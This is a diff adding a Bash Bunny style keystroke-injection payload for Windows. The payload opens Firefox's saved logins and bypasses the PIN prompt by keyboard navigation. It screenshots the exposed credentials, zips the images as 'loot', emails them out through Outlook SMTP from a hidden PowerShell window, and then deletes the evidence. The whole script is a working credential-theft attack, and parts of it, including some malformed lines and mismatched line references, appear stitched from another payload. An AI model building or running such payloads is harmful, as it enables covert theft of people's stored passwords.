@@ -1,0 +1,215 @@
+#!/bin/bash
+# Title: HARVESTER_OF_SORROW
+# Author: LulzAnarchyAnon
+# Description: This payload is a long, hard work around to bypass Microsoft Security in Firefox where a
+# pin, or password is required to export saved log in credentials.
+# The payload opens firefox about:logins, and tabs, and arrows its way through options. It then takes 
+# a screen shot with the first set of log in credentials made visible. Finally it sends the screenshot  
+# to an email of your choosing. 
+# Target: Windows 10, PowerShell & Mozilla Firefox
+# Props: Darren Kitchen, KARROTKAK3, I am Jakoby and the-jcksn
+# Version:      1.0
+# Category: Credentials 
+
+# Attackmodes:  HID & STORAGE 
+
+#Payload DELAYS,TABS AND ARROWS may need to be ajusted depending on target system speeds.  
+#After email aqusition you will be able to adjust DELAYS,TABS AND ARROWS to harvest other creds from 
+#the email screen shot.
+
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+
+LED ATTACK
+
+QUACK GUI r
+QUACK DELAY 200
+QUACK STRING firefox about:logins
+QUACK ENTER
+QUACK DELAY 1000
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK TAB
+QUACK DELAY 1000
+QUACK SHIFT SPACE
+QUACK DELAY 5000
+QUACK PRINTSCREEN
+DELAY 5000
+QUACK GUI r
+QUACK STRING powershell -windowstyle hidden
+QUACK ENTER
+QUACK DELAY 2000
+QUACK STRING mspaint
+QUACK ENTER
+QUACK DELAY 5000
+QUACK CTRL v
+QUACK DELAY 2000
+QUACK CTRL s
+QUACK TAB
+QUACK DELAY 300
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 100
+QUACK RIGHTARROW
+QUACK DELAY 100
+QUACK DOWNARROW
+QUACK DELAY 100
+QUACK RIGHTARROW
+QUACK DELAY 100
+QUACK RIGHTARROW
+QUACK DELAY 200
+QUACK QUACK TAB
+QUACK DELAY 200
+QUACK ENTER
+QUACK CTRL RIGHTARROW
+QUACK DELAY 100
+QUACK CTRL RIGHTARROW
+QUACK DELAY 100
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+QUACK RIGHTARROW
+QUACK DELAY 200
+QUACK RIGHTARROW
+QUACK ENTER
+QUACK TAB
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ALT f
+QUACK DELAY 50
+QUACK ALT X
+QUACK DELAY 50
+QUACK ALT f
+QUACK DELAY 50
+QUACK X
+QUACK DELAY 2000
+
+#You must change the USER_EMAIL and USER_PASSWORD to your outlook credentials.
+#Can exfil more than 5, but I chose 5 to keep file sizes low.
+#Can exfil from directory other than screenshots by changing path on lines 18, 57, and 61.
+#You might have to adjust the delays, depending on the target machine, but these worked ok for me.
+#Use responsibly, and within the confines of the law.
+
+QUACK DELAY 2000
+QUACK GUI r
+QUACK DELAY 200
+
+#Navigating to the directory to exfil from - change the following if you do not want the latest screenshots
+
+QUACK STRING %USERPROFILE%\Pictures\Screenshots
+QUACK ENTER
+QUACK DELAY 150
+
+#Sorting the files by date
+
+QUACK MENU
+QUACK DELAY 150
+QUACK STRING o
+QUACK DELAY 150
+QUACK DOWNARROW
+QUACK DELAY 150
+QUACK ENTER
+QUACK DELAY 150
+
+# Selecting files to exfil, repeat this line if you want more than 5, but bear in mind this might impact some of the delays
+
+QUACK SHIFT RIGHTARROW
+QUACK SHIFT RIGHTARROW
+QUACK QUACK SHIFT RIGHTARROW
+QUACK SHIFT RIGHTARROW
+QUACK DELAY 150
+QUACK REM sending files to loot.zip
+QUACK MENU
+QUACK DELAY 150
+QUACK STRING n
+QUACK DELAY 200
+QUACK DOWNARROW
+QUACK DELAY 150
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING loot
+QUACK ENTER
+QUACK QUACK DELAY 150
+QUACK ALT F4
+QUACK DELAY 150
+QUACK GUI r
+QUACK DELAY 150
+
+#Open powershell and send the email
+
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 500
+
+#CHANGE THE USERNAME (3 times) AND PASSWORD (once) IN THE FOLLOWING
+
+QUACK STRING Send-MailMessage -From user@example.com -To user@example.com -Subject "Photo loot" -Body "Please find attached your zip file" -Attachment "Pictures\Screenshots\loot.zip" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList user@example.com, (ConvertTo-SecureString -String "supersecretpassword" -AsPlainText -Force))
+QUACK ENTER
+QUACK DELAY 500
+QUACK REM cleanup
+QUACK STRING del Pictures\Screenshots\loot.zip
+QUACK ENTER
+QUACK DELAY 150
+QUACK STRING exit
+QUACK ENTER
+QUACK DELAY 200
+QUACK ALT c
+
+LED FINISH
